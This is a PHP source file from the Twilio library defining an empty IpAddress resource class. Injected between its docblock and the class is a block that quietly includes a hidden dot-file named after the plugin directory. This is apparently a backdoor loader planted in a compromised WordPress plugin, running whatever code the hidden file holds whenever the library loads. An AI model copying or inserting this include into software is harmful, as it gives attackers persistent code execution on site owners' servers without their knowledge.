<?php

/**
 * A single IpAddress
 *
 * .. php:attr:: date_created
 *
 *    The date the IpAddress was created
 *
 * .. php:attr:: date_updated
 *
 *    The date the IpAddress was updated
 *
 * .. php:attr:: sid
 *
 *    A 34 character string that identifies this object
 *
 * .. php:attr:: account_sid
 *
 *    The account that created this credential
 *
 * .. php:attr:: friendly_name
 *
 *    The friendly name of the IpAddress
 *
 * .. php:attr:: ip_address
 *
 *    The ip address of this IpAddress object
 *
 * .. php:attr:: uri
 *
 *    The uri of this IpAddress object
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Services_Twilio_Rest_IpAddress extends Services_Twilio_InstanceResource { }
